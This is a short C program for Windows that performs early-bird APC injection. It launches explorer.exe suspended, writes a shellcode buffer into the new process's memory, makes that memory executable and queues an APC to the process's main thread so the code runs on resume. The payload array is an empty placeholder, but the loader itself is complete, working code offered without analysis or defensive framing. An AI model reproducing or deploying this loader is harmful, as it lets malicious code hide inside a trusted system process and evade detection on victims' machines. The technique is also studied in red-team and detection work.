#include <windows.h>

// Configuration
char *targetPath = "explorer.exe";
unsigned char payloadBuffer[] = { /* shellcode bytes go here. the shellcode must exit the process, otherwise the process will continue its normal startup */ };

int main() {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. Create target process suspended
    CreateProcessA(NULL, targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // 2. Allocate memory in target process
    SIZE_T payloadSize = sizeof(payloadBuffer);
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 3. Write payload bytes
    WriteProcessMemory(pi.hProcess, remoteMem, payloadBuffer, payloadSize, NULL);

    // 4. Make memory executable
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    // 5. Queue APC to primary thread
    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);

    // 6. Resume execution
    ResumeThread(pi.hThread);

    // 7. Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;

}
